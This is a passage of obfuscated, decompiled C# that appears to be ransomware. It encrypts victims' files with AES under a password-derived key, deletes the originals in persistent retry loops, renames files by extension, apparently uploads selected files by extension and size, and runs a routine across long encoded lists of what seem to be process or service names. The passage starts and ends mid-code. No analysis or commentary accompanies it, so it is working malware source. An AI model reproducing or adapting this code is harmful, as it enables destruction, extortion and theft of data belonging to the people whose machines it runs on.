						string text2 = TVJVYBTbELDF.dgXrAjujXbg(32);
						string s2 = hTchmIjujxwM.GMfqOAiITqajuCI(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.hRiNsPrmWAghH != vKcpWEFEAjeH.getString_0(107389729))
						{
							if (!daZUEUUguJZ)
							{
								if (!tcfvsNKQegWI)
								{
									OWjMVugaEAAi(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD, CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD + CS_0024_003C_003E8__locals0.hRiNsPrmWAghH, uoLtoKgRiGap);
								}
								else
								{
									OWjMVugaEAAi(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD, CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD + CS_0024_003C_003E8__locals0.hRiNsPrmWAghH, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!tcfvsNKQegWI)
									{
										qqsrsxcqEleW(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD, CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD + CS_0024_003C_003E8__locals0.hRiNsPrmWAghH, uoLtoKgRiGap);
									}
									else
									{
										qqsrsxcqEleW(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD, CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD + CS_0024_003C_003E8__locals0.hRiNsPrmWAghH, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (ypofoMoLMAIop)
									{
										try
										{
											File.AppendAllText(xXiTPiYVwRAzXZ, vKcpWEFEAjeH.getString_0(107390520) + CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD + vKcpWEFEAjeH.getString_0(107389747) + ex6.Message + vKcpWEFEAjeH.getString_0(107396228));
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!daZUEUUguJZ)
						{
							if (!tcfvsNKQegWI)
							{
								OWjMVugaEAAi(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD, CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD + vKcpWEFEAjeH.getString_0(107389724), uoLtoKgRiGap);
							}
							else
							{
								OWjMVugaEAAi(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD, CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD + vKcpWEFEAjeH.getString_0(107389724), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!tcfvsNKQegWI)
								{
									qqsrsxcqEleW(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD, CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD, uoLtoKgRiGap);
								}
								else
								{
									qqsrsxcqEleW(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD, CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (ypofoMoLMAIop)
								{
									try
									{
										File.AppendAllText(xXiTPiYVwRAzXZ, vKcpWEFEAjeH.getString_0(107390520) + CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD + vKcpWEFEAjeH.getString_0(107389747) + ex8.Message + vKcpWEFEAjeH.getString_0(107396228));
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (tcfvsNKQegWI)
						{
							if (CS_0024_003C_003E8__locals0.hRiNsPrmWAghH != vKcpWEFEAjeH.getString_0(107389729))
							{
								TpkMkTwVPbqk(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD + CS_0024_003C_003E8__locals0.hRiNsPrmWAghH, bytes2);
							}
							else
							{
								TpkMkTwVPbqk(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0748;
			IL_0748:
			CS_0024_003C_003E8__locals0.RAObKroldugiJ.Remove(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD);
		});
	}

	private static void VDsJZPQbwwp(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (roOXwZlrCIU == getString_0(107396902))
					{
						foreach (string item in KtFLKdivITUMrO)
						{
							if (string_0.ToLower().EndsWith(item) && LIsjhaBFCgPZ == getString_0(107396902))
							{
								if (Convert.ToInt32(EdfHdpefStIQ) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										VLhifxtGlnnIec.OoNgWYAVfA(getString_0(107394086), getString_0(107394081), getString_0(107394036), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && LIsjhaBFCgPZ == getString_0(107396359))
							{
								try
								{
									VLhifxtGlnnIec.OoNgWYAVfA(getString_0(107394086), getString_0(107394081), getString_0(107394036), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107389707)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107389707), getString_0(107393973)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void qqsrsxcqEleW(string string_0, string string_1, byte[] byte_0)
	{
		if (roOXwZlrCIU == getString_0(107396902))
		{
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			foreach (string item in KtFLKdivITUMrO)
			{
				if (string_0.ToLower().EndsWith(item) && LIsjhaBFCgPZ == getString_0(107396902))
				{
					if (Convert.ToInt32(EdfHdpefStIQ) * 1024 * 1024 > fileStream.Length)
					{
						try
						{
							VLhifxtGlnnIec.OoNgWYAVfA(getString_0(107394086), getString_0(107394081), getString_0(107394036), string_0);
						}
						catch
						{
						}
					}
				}
				else if (string_0.ToLower().EndsWith(item) && LIsjhaBFCgPZ == getString_0(107396359))
				{
					try
					{
						VLhifxtGlnnIec.OoNgWYAVfA(getString_0(107394086), getString_0(107394081), getString_0(107394036), string_0);
					}
					catch
					{
					}
				}
			}
			fileStream.Dispose();
		}
		byte[] bytes = ziPgVxfWfuZ.raaExrXtGHRqGg(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
		}
	}

	private static void OWjMVugaEAAi(string string_0, string string_1, byte[] byte_0)
	{
		rpJKgXWfXFVIf CS_0024_003C_003E8__locals0 = new rpJKgXWfXFVIf();
		CS_0024_003C_003E8__locals0.JZydQPqlQGsnF = string_0;
		CS_0024_003C_003E8__locals0.GwyCJqLPUFGZwM = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string gwyCJqLPUFGZwM = CS_0024_003C_003E8__locals0.GwyCJqLPUFGZwM;
			FileStream fileStream = new FileStream(gwyCJqLPUFGZwM, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (aCercHDJqlth == getString_0(107396902))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.JZydQPqlQGsnF, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.JZydQPqlQGsnF, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.JZydQPqlQGsnF, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.GwyCJqLPUFGZwM.Length > 0)
				{
					if (roOXwZlrCIU == getString_0(107396902))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.JZydQPqlQGsnF, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in KtFLKdivITUMrO)
						{
							if (CS_0024_003C_003E8__locals0.JZydQPqlQGsnF.ToLower().EndsWith(item) && LIsjhaBFCgPZ == getString_0(107396902))
							{
								if (Convert.ToInt32(EdfHdpefStIQ) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										VLhifxtGlnnIec.OoNgWYAVfA(getString_0(107394086), getString_0(107394081), getString_0(107394036), CS_0024_003C_003E8__locals0.JZydQPqlQGsnF);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.JZydQPqlQGsnF.ToLower().EndsWith(item) && LIsjhaBFCgPZ == getString_0(107396359))
							{
								try
								{
									VLhifxtGlnnIec.OoNgWYAVfA(getString_0(107394086), getString_0(107394081), getString_0(107394036), CS_0024_003C_003E8__locals0.JZydQPqlQGsnF);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.JZydQPqlQGsnF);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.GwyCJqLPUFGZwM.EndsWith(getString_0(107389707)))
					{
						File.Move(CS_0024_003C_003E8__locals0.GwyCJqLPUFGZwM, CS_0024_003C_003E8__locals0.GwyCJqLPUFGZwM.Replace(getString_0(107389707), getString_0(107393973)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.GwyCJqLPUFGZwM))
							{
								File.Delete(CS_0024_003C_003E8__locals0.GwyCJqLPUFGZwM);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (ypofoMoLMAIop)
			{
				try
				{
					File.AppendAllText(xXiTPiYVwRAzXZ, getString_0(107390503) + CS_0024_003C_003E8__locals0.JZydQPqlQGsnF + getString_0(107389730) + ex2.Message + getString_0(107396211));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__5()
	{
		List<string> pZMRrEnqoGIM = PZMRrEnqoGIM;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
			{
				sonqSVTFpSTJ(getString_0(107389645), string_0);
			};
		}
		Parallel.ForEach(pZMRrEnqoGIM, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		List<string> vvJgJsMDGbodB = VvJgJsMDGbodB;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
			{
				sonqSVTFpSTJ(getString_0(107392642), string_0);
			};
		}
		Parallel.ForEach(vvJgJsMDGbodB, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		List<string> source = ptHRFkgcvuKJ;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
			{
				sonqSVTFpSTJ(SkTISxbocVBV(getString_0(107389668)), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
		if (SOsjYHrZSaEZ == getString_0(107396902))
		{
			string[] zBxlVVUbYpltsUa = ZBxlVVUbYpltsUa;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
				{
					sonqSVTFpSTJ(SkTISxbocVBV(getString_0(107389668)), getString_0(107389611) + string_0 + getString_0(107389634));
				};
			}
			Parallel.ForEach(zBxlVVUbYpltsUa, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
		}
		if (!ttCQNydAdpXDD().Contains(getString_0(107390369)))
		{
			MdrmbcHVOrzfshXi(ZlaqrKhgbBxdh);
		}
		else
		{
			List<string> source2 = toreclCgdJYGB;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
				{
					sonqSVTFpSTJ(SkTISxbocVBV(KCuOidVYGqyU(getString_0(107389629))), string_0);
				};
			}
			Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
		}
		List<string> tZZUOUERRqxMjP = TZZUOUERRqxMjP;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
			{
				sonqSVTFpSTJ(SkTISxbocVBV(getString_0(107389604)), string_0);
			};
		}
		Parallel.ForEach(tZZUOUERRqxMjP, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
		List<string> dXbQUKyKVIIp = DXbQUKyKVIIp;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
			{
				sonqSVTFpSTJ(getString_0(107389555), string_0);
			};
		}
		Parallel.ForEach(dXbQUKyKVIIp, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
	}

	private static void _003CMain_003Eb__6(string string_0)
	{
		sonqSVTFpSTJ(getString_0(107389645), string_0);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		sonqSVTFpSTJ(getString_0(107392642), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		sonqSVTFpSTJ(SkTISxbocVBV(getString_0(107389668)), string_0);
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		sonqSVTFpSTJ(SkTISxbocVBV(getString_0(107389668)), getString_0(107389611) + string_0 + getString_0(107389634));
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		sonqSVTFpSTJ(SkTISxbocVBV(KCuOidVYGqyU(getString_0(107389629))), string_0);
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		sonqSVTFpSTJ(SkTISxbocVBV(getString_0(107389604)), string_0);
	}

	private static void _003CMain_003Eb__c(string string_0)
	{
		sonqSVTFpSTJ(getString_0(107389555), string_0);
	}

	static RvpNXHMAnDGj()
	{
		Strings.CreateGetStringDelegate(typeof(RvpNXHMAnDGj));
		FDEoXEMOMuIl = getString_0(107393949);
		uoLtoKgRiGap = null;
		aYCgstfeuDqC = getString_0(107396359);
		bYcncUGJXgnTPoDc = getString_0(107389546);
		jdESWHKNpYUqO = new List<string>();
		uNLCNAlVYQT = new List<string>();
		RJJbqlKdZXlD = getString_0(107396359);
		AxoZwXttJq = getString_0(107393973);
		yzIAxNzzweOiCJn = getString_0(107393973);
		DuUZzDhbMnZQ = getString_0(107396359);
		dCuSllWejjixrr = 0;
		ZSgNOgHAnNUh = getString_0(107396359);
		oIGJrbczpv = getString_0(107396359);
		kPYyimbMmVgm = getString_0(107396359);
		eYvLmQuBiiyyFF = getString_0(107389565);
		YxZifczjzSS = getString_0(107396902);
		lzyRiEsWUsakMX = getString_0(107396359);
		eZFubfNftlu = getString_0(107396359);
		mUNykcZctFGp = getString_0(107396359);
		rXEajpcKSQopI = new List<string>
		{
			SkTISxbocVBV(getString_0(107390040)),
			SkTISxbocVBV(getString_0(107390055)),
			SkTISxbocVBV(getString_0(107389998)),
			SkTISxbocVBV(getString_0(107390013)),
			SkTISxbocVBV(getString_0(107389988)),
			SkTISxbocVBV(getString_0(107389931)),
			SkTISxbocVBV(getString_0(107389946)),
			SkTISxbocVBV(getString_0(107389921)),
			SkTISxbocVBV(getString_0(107389896)),
			SkTISxbocVBV(getString_0(107389839)),
			SkTISxbocVBV(getString_0(107389854)),
			SkTISxbocVBV(getString_0(107389829)),
			SkTISxbocVBV(getString_0(107389260))
		};
		zctpFYIogjdJ = new List<string>();
		PgAetqLSfiok = getString_0(107396359);
		CksyQDsMQxOivKBJ = getString_0(107396359);
		KFOzWPkqEjL = getString_0(107396359);
		joYcYYfKPdeY = new List<string>();
		JxmvhMInSRUBKVr = getString_0(107396359);
		ufVvwFFkfqx = getString_0(107389235);
		kRzbTYvNtBEG = getString_0(107396359);
		mOebASlflyMI = getString_0(107396359);
		VvJgJsMDGbodB = new List<string>
		{
			SkTISxbocVBV(getString_0(107389218)),
			SkTISxbocVBV(getString_0(107389185)),
			SkTISxbocVBV(getString_0(107389152)),
			SkTISxbocVBV(getString_0(107389119)),
			SkTISxbocVBV(getString_0(107389086)),
			SkTISxbocVBV(getString_0(107389057)),
			SkTISxbocVBV(getString_0(107389512)),
			SkTISxbocVBV(getString_0(107389451)),
			SkTISxbocVBV(getString_0(107389438)),
			SkTISxbocVBV(getString_0(107389373)),
			SkTISxbocVBV(getString_0(107389340)),
			SkTISxbocVBV(getString_0(107389307)),
			SkTISxbocVBV(getString_0(107388762)),
			SkTISxbocVBV(getString_0(107388733)),
			SkTISxbocVBV(getString_0(107388704)),
			SkTISxbocVBV(getString_0(107388631)),
			SkTISxbocVBV(getString_0(107388590)),
			SkTISxbocVBV(getString_0(107388533)),
			SkTISxbocVBV(getString_0(107389028)),
			SkTISxbocVBV(getString_0(107388995)),
			SkTISxbocVBV(getString_0(107388966)),
			SkTISxbocVBV(getString_0(107388925)),
			SkTISxbocVBV(getString_0(107388852)),
			SkTISxbocVBV(getString_0(107388819)),
			SkTISxbocVBV(getString_0(107388802)),
			SkTISxbocVBV(getString_0(107388201)),
			SkTISxbocVBV(getString_0(107388192)),
			SkTISxbocVBV(getString_0(107388163)),
			SkTISxbocVBV(getString_0(107388122)),
			SkTISxbocVBV(getString_0(107388065)),
			SkTISxbocVBV(getString_0(107388512)),
			SkTISxbocVBV(getString_0(107388455)),
			SkTISxbocVBV(getString_0(107388390)),
			SkTISxbocVBV(getString_0(107388309)),
			SkTISxbocVBV(getString_0(107387732)),
			SkTISxbocVBV(getString_0(107387707)),
			SkTISxbocVBV(getString_0(107387674)),
			SkTISxbocVBV(getString_0(107387601)),
			SkTISxbocVBV(getString_0(107387592)),
			SkTISxbocVBV(getString_0(107387547)),
			SkTISxbocVBV(getString_0(107387518)),
			SkTISxbocVBV(getString_0(107387965)),
			SkTISxbocVBV(getString_0(107387892)),
			SkTISxbocVBV(getString_0(107387859)),
			SkTISxbocVBV(getString_0(107387818)),
			SkTISxbocVBV(getString_0(107387801)),
			SkTISxbocVBV(getString_0(107387212)),
			SkTISxbocVBV(getString_0(107387171)),
			SkTISxbocVBV(getString_0(107387094)),
			SkTISxbocVBV(getString_0(107387049)),
			SkTISxbocVBV(getString_0(107387036)),
			SkTISxbocVBV(getString_0(107387475)),
			SkTISxbocVBV(getString_0(107387402)),
			SkTISxbocVBV(getString_0(107387373)),
			SkTISxbocVBV(getString_0(107387364)),
			SkTISxbocVBV(getString_0(107387299)),
			SkTISxbocVBV(getString_0(107386710)),
			SkTISxbocVBV(getString_0(107386713)),
			SkTISxbocVBV(getString_0(107386636)),
			SkTISxbocVBV(getString_0(107386571)),
			SkTISxbocVBV(getString_0(107386542)),
			SkTISxbocVBV(getString_0(107386485)),
			SkTISxbocVBV(getString_0(107386932)),
			SkTISxbocVBV(getString_0(107386891)),
			SkTISxbocVBV(getString_0(107386862)),
			SkTISxbocVBV(getString_0(107386853)),
			SkTISxbocVBV(getString_0(107386740)),
			SkTISxbocVBV(getString_0(107386167)),
			SkTISxbocVBV(getString_0(107386094)),
			SkTISxbocVBV(getString_0(107386081)),
			SkTISxbocVBV(getString_0(107386048)),
			SkTISxbocVBV(getString_0(107385975)),
			SkTISxbocVBV(getString_0(107386410)),
			SkTISxbocVBV(getString_0(107386397)),
			SkTISxbocVBV(getString_0(107386308)),
			SkTISxbocVBV(getString_0(107386227)),
			SkTISxbocVBV(getString_0(107385686)),
			SkTISxbocVBV(getString_0(107385645)),
			SkTISxbocVBV(getString_0(107385580)),
			SkTISxbocVBV(getString_0(107385563)),
			SkTISxbocVBV(getString_0(107385506)),
			SkTISxbocVBV(getString_0(107385473)),
			SkTISxbocVBV(getString_0(107385924)),
			SkTISxbocVBV(getString_0(107385835)),
			SkTISxbocVBV(getString_0(107387707)),
			SkTISxbocVBV(getString_0(107385778)),
			SkTISxbocVBV(getString_0(107385737)),
			SkTISxbocVBV(getString_0(107385136)),
			SkTISxbocVBV(getString_0(107385123)),
			SkTISxbocVBV(getString_0(107385062)),
			SkTISxbocVBV(getString_0(107385005)),
			SkTISxbocVBV(getString_0(107384992)),
			SkTISxbocVBV(getString_0(107385423)),
			SkTISxbocVBV(getString_0(107388065)),
			SkTISxbocVBV(getString_0(107385358)),
			SkTISxbocVBV(getString_0(107385349)),
			SkTISxbocVBV(getString_0(107385260)),
			SkTISxbocVBV(getString_0(107388512)),
			SkTISxbocVBV(getString_0(107385219)),
			SkTISxbocVBV(getString_0(107384626)),
			SkTISxbocVBV(getString_0(107384569)),
			SkTISxbocVBV(getString_0(107384472)),
			SkTISxbocVBV(getString_0(107384455)),
			SkTISxbocVBV(getString_0(107388390)),
			SkTISxbocVBV(getString_0(107384890)),
			SkTISxbocVBV(getString_0(107387674)),
			SkTISxbocVBV(getString_0(107388309)),
			SkTISxbocVBV(getString_0(107384857)),
			SkTISxbocVBV(getString_0(107384800)),
			SkTISxbocVBV(getString_0(107387732)),
			SkTISxbocVBV(getString_0(107384767)),
			SkTISxbocVBV(getString_0(107384686)),
			SkTISxbocVBV(getString_0(107384157)),
			SkTISxbocVBV(getString_0(107388122)),
			SkTISxbocVBV(getString_0(107384132)),
			SkTISxbocVBV(getString_0(107384055)),
			SkTISxbocVBV(getString_0(107384058)),
			SkTISxbocVBV(getString_0(107384029)),
			SkTISxbocVBV(getString_0(107383952)),
			SkTISxbocVBV(getString_0(107383919)),
			SkTISxbocVBV(getString_0(107384406)),
			SkTISxbocVBV(getString_0(107384361)),
			SkTISxbocVBV(getString_0(107384336)),
			SkTISxbocVBV(getString_0(107384327)),
			SkTISxbocVBV(getString_0(107384282)),
			SkTISxbocVBV(getString_0(107384201)),
			SkTISxbocVBV(getString_0(107383632)),
			SkTISxbocVBV(getString_0(107383599)),
			SkTISxbocVBV(getString_0(107383586)),
			SkTISxbocVBV(getString_0(107383553)),
			SkTISxbocVBV(getString_0(107383480)),
			SkTISxbocVBV(getString_0(107388163)),
			SkTISxbocVBV(getString_0(107384201)),
			SkTISxbocVBV(getString_0(107383439)),
			SkTISxbocVBV(getString_0(107383410)),
			SkTISxbocVBV(getString_0(107383893)),
			SkTISxbocVBV(getString_0(107383876)),
			SkTISxbocVBV(getString_0(107383835)),
			SkTISxbocVBV(getString_0(107383774)),
			SkTISxbocVBV(getString_0(107383669)),
			SkTISxbocVBV(getString_0(107383128)),
			SkTISxbocVBV(getString_0(107383095)),
			SkTISxbocVBV(getString_0(107383022)),
			SkTISxbocVBV(getString_0(107382993)),
			SkTISxbocVBV(getString_0(107382980)),
			SkTISxbocVBV(getString_0(107382915)),
			SkTISxbocVBV(getString_0(107383394)),
			SkTISxbocVBV(getString_0(107383317)),
			SkTISxbocVBV(getString_0(107383256)),
			SkTISxbocVBV(getString_0(107383223)),
			SkTISxbocVBV(getString_0(107383178)),
			SkTISxbocVBV(getString_0(107382601)),
			SkTISxbocVBV(getString_0(107382600)),
			SkTISxbocVBV(getString_0(107382559)),
			SkTISxbocVBV(getString_0(107382478)),
			SkTISxbocVBV(getString_0(107388802)),
			SkTISxbocVBV(getString_0(107382449)),
			SkTISxbocVBV(getString_0(107382392)),
			SkTISxbocVBV(getString_0(107382863)),
			SkTISxbocVBV(getString_0(107382850)),
			SkTISxbocVBV(getString_0(107382809)),
			SkTISxbocVBV(getString_0(107382732)),
			SkTISxbocVBV(getString_0(107382671)),
			SkTISxbocVBV(getString_0(107382654)),
			SkTISxbocVBV(getString_0(107382061)),
			SkTISxbocVBV(getString_0(107382004)),
			SkTISxbocVBV(getString_0(107381979)),
			SkTISxbocVBV(getString_0(107381902)),
			SkTISxbocVBV(getString_0(107381893)),
			SkTISxbocVBV(getString_0(107382316)),
			SkTISxbocVBV(getString_0(107388201)),
			SkTISxbocVBV(getString_0(107382275)),
			SkTISxbocVBV(getString_0(107382246)),
			SkTISxbocVBV(getString_0(107382213)),
			SkTISxbocVBV(getString_0(107382172)),
			SkTISxbocVBV(getString_0(107382143)),
			SkTISxbocVBV(getString_0(107388819)),
			SkTISxbocVBV(getString_0(107381558)),
			SkTISxbocVBV(getString_0(107381541)),
			SkTISxbocVBV(getString_0(107381512)),
			SkTISxbocVBV(getString_0(107386542)),
			SkTISxbocVBV(getString_0(107381479)),
			SkTISxbocVBV(getString_0(107381512)),
			SkTISxbocVBV(getString_0(107381418)),
			SkTISxbocVBV(getString_0(107381389)),
			SkTISxbocVBV(getString_0(107381360)),
			SkTISxbocVBV(getString_0(107381855)),
			SkTISxbocVBV(getString_0(107381774)),
			SkTISxbocVBV(getString_0(107381765)),
			SkTISxbocVBV(getString_0(107381704)),
			SkTISxbocVBV(getString_0(107381643)),
			SkTISxbocVBV(getString_0(107381634)),
			SkTISxbocVBV(getString_0(107381045)),
			SkTISxbocVBV(getString_0(107381032)),
			SkTISxbocVBV(getString_0(107380999)),
			SkTISxbocVBV(getString_0(107380910)),
			SkTISxbocVBV(getString_0(107380897)),
			SkTISxbocVBV(getString_0(107381352)),
			SkTISxbocVBV(getString_0(107381319)),
			SkTISxbocVBV(getString_0(107381278)),
			SkTISxbocVBV(getString_0(107381249)),
			SkTISxbocVBV(getString_0(107381188)),
			SkTISxbocVBV(getString_0(107381155)),
			SkTISxbocVBV(getString_0(107413322)),
			SkTISxbocVBV(getString_0(107413313)),
			SkTISxbocVBV(getString_0(107413232)),
			SkTISxbocVBV(getString_0(107413199)),
			SkTISxbocVBV(getString_0(107413182)),
			SkTISxbocVBV(getString_0(107413105)),
			SkTISxbocVBV(getString_0(107413600)),
			SkTISxbocVBV(getString_0(107413523)),
			SkTISxbocVBV(getString_0(107413506)),
			SkTISxbocVBV(getString_0(107413473)),
			SkTISxbocVBV(getString_0(107413400)),
			SkTISxbocVBV(getString_0(107413359)),
			SkTISxbocVBV(getString_0(107412834)),
			SkTISxbocVBV(getString_0(107383835)),
			SkTISxbocVBV(getString_0(107412801)),
			SkTISxbocVBV(getString_0(107412728)),
			SkTISxbocVBV(getString_0(107412703)),
			SkTISxbocVBV(getString_0(107412674)),
			SkTISxbocVBV(getString_0(107412641)),
			SkTISxbocVBV(getString_0(107412608)),
			SkTISxbocVBV(getString_0(107413039)),
			SkTISxbocVBV(getString_0(107413010)),
			SkTISxbocVBV(getString_0(107412997)),
			SkTISxbocVBV(getString_0(107412920)),
			SkTISxbocVBV(getString_0(107412879)),
			SkTISxbocVBV(getString_0(107412310)),
			SkTISxbocVBV(getString_0(107412293)),
			SkTISxbocVBV(getString_0(107412264)),
			SkTISxbocVBV(getString_0(107412219))
		};
		PZMRrEnqoGIM = new List<string>
		{
			SkTISxbocVBV(getString_0(107412146)),
